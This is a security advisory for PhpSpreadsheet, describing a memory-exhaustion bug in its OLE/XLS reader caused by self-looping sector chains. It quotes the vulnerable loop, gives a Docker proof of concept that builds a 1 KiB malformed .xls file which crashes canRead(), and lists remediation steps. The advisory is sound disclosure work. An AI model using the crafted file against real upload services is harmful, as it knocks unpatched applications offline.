# [H] PHPSpreadsheet: XLS/OLE sector-chain self-loop causes memory exhaustion

## Summary
Severity: High
Advisory: GHSA-xh5m-36r6-47m3
CVE: CVE-2026-59933
CWE: CWE-400, CWE-835
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-23
Source: https://github.com/advisories/GHSA-xh5m-36r6-47m3
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=4.0.0 <5.8.1
- Packagist: `phpoffice/phpspreadsheet` — affected >=3.3.0 <3.10.7
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.4.7
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.18
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.30.6

## Details
## Summary

PhpSpreadsheet's OLE reader follows sector chains from attacker-controlled XLS/OLE metadata without detecting cycles or enforcing a maximum chain length. A tiny malformed `.xls`/OLE file can set the small-block depot sector chain to point back to itself. During normal XLS detection, `OLERead::read()` appends the same sector data repeatedly until the PHP process exhausts memory.

This is reachable from `Reader\Xls::canRead()` and therefore from automatic spreadsheet type detection. Applications that accept attacker-controlled spreadsheet uploads can suffer denial of service from a very small file.

## Vulnerability details

`OLERead::read()` loads the input and builds sector chains from attacker-controlled OLE header and allocation-table values:

- `src/PhpSpreadsheet/Shared/OLERead.php:82` reads the entire file after validating only the OLE magic.
- `src/PhpSpreadsheet/Shared/OLERead.php:84-97` reads sector-chain metadata from the file header.
- `src/PhpSpreadsheet/Shared/OLERead.php:132-146` builds `bigBlockChain` and then follows the small-block depot chain.

The vulnerable loop is:

```php
$sbdBlock = $this->sbdStartBlock;
$this->smallBlockChain = '';
while ($sbdBlock != -2) {
    $pos = ($sbdBlock + 1) * self::BIG_BLOCK_SIZE;

    $this->smallBlockChain .= substr($this->data, $pos, 4 * $bbs);
    $pos += 4 * $bbs;

    $sbdBlock = self::getInt4d($this->bigBlockChain, $sbdBlock * 4);
}
```

There is no visited-sector set, no maximum iteration count, no EOF bound, and no check that the next sector differs from a previously visited sector. If the allocation table maps sector `0` to sector `0`, the loop appends the same sector data forever until memory is exhausted.

The issue is reachable during normal reader detection/loading:

- `src/PhpSpreadsheet/Reader/XlsBase.php:153-165` calls `OLERead::read()` from `canRead()`.
- `src/PhpSpreadsheet/Reader/Xls.php:376-383` calls `OLERead::read()` from `loadOLE()`.
- `src/PhpSpreadsheet/IOFactory.php:181-213` calls `canRead()` while creating a reader for a file, so automatic format detection can trigger the issue.

Similar unbounded sector-chain walks exist later in stream reading:

- `src/PhpSpreadsheet/Shared/OLERead.php:175-180`
- `src/PhpSpreadsheet/Shared/OLERead.php:198-202`
- `src/PhpSpreadsheet/Shared/OLERead.php:218-222`

The proof of concept below confirms the small-block depot chain loop; the same remediation pattern should be applied to all sector-chain walks.

## Impact

A 1 KiB file can crash a PHP worker during `Xls::canRead()` or automatic file-type detection. This can deny service to web applications, queue workers, preview services, or document converters that process untrusted spreadsheet uploads.

The issue occurs before the file is recognized as a valid workbook stream, so even detection/probing paths are affected.

## Safe local proof of concept

This proof of concept uses only Docker with `--network none`; it creates the malformed OLE file inside the container and does not contact external infrastructure.

```bash
docker run --rm --network none -i \
  -v /home/sondt23/Github/CVE/ares/github-repo/PhpSpreadsheet:/app \
  -w /app ghcr.io/typo3/core-testing-php82:1.15 sh <<'SH'
set -eu
php -r '
$data = str_repeat("\0", 1024);
$set = function (int $off, string $bytes) use (&$data): void { $data = substr_replace($data, $bytes, $off, strlen($bytes)); };
$set(0, hex2bin("D0CF11E0A1B11AE1"));
$set(28, "\xfe\xff");
$set(30, pack("v", 9));     // sector size 512
$set(32, pack("v", 6));     // mini sector size 64
$set(44, pack("l", 1));     // 1 SAT sector
$set(48, pack("l", 0));     // directory first sector 0
$set(56, pack("l", 4096));  // mini stream cutoff
$set(60, pack("l", 0));     // SSAT first sector 0
$set(64, pack("l", 1));     // one SSAT sector
$set(68, pack("l", -2));    // no MSAT extension
$set(72, pack("l", 0));     // no extension sectors
$set(76, pack("l", 0));     // DIFAT says SAT is sector 0
$set(512, pack("l", 0));    // SAT entry for sector 0 points to itself
file_put_contents("/tmp/phpspreadsheet-ole-selfloop.xls", $data);
printf("ole_size=%d\n", filesize("/tmp/phpspreadsheet-ole-selfloop.xls"));
'
php -d memory_limit=64M -d display_errors=1 -r '
require "/app/vendor/autoload.php";
$r = new PhpOffice\PhpSpreadsheet\Reader\Xls();
var_dump($r->canRead("/tmp/phpspreadsheet-ole-selfloop.xls"));
' 2>&1 || true
SH
```

Observed output:

```text
ole_size=1024
PHP Fatal error:  Allowed memory size of 67108864 bytes exhausted (tried to allocate 48234528 bytes) in /app/src/PhpSpreadsheet/Shared/OLERead.php on line 143
PHP Stack trace:
PHP   1. {main}() Command line code:0
PHP   2. PhpOffice\PhpSpreadsheet\Reader\XlsBase->canRead($filename = '/tmp/phpspreadsheet-ole-selfloop.xls') Command line code:4
PHP   3. PhpOffice\PhpSpreadsheet\Shared\OLERead->read($filename = '/tmp/phpspreadsheet-ole-selfloop.xls') /app/src/PhpSpreadsheet/Reader/XlsBase.php:164
```

## Suggested remediation

- Validate every OLE sector-chain walk with:
  - a visited-sector set to reject cycles;
  - maximum chain length based on file size and sector size;
  - bounds checks before reading from `$this->data`, `$this->bigBlockChain`, or `$this->smallBlockChain`;
  - rejection of negative sector IDs other than the documented end-of-chain marker.
- Replace fatal memory exhaustion with a recoverable `Reader\Exception` for malformed OLE chains.
- Apply the same guarded chain-walk helper to:
  - small-block depot chain construction;
  - small-block stream extraction;
  - big-block stream extraction;
  - `readData()`.
- Add regression tests with self-looping and out-of-range SAT/SSAT chains.

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-xh5m-36r6-47m3
- https://github.com/PHPOffice/PhpSpreadsheet/commit/85f2556b0bf5269061bf45932ecda8a128d81750
- https://github.com/PHPOffice/PhpSpreadsheet
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/1.30.6
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/2.1.18
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/2.4.7
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/3.10.7
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/5.8.1
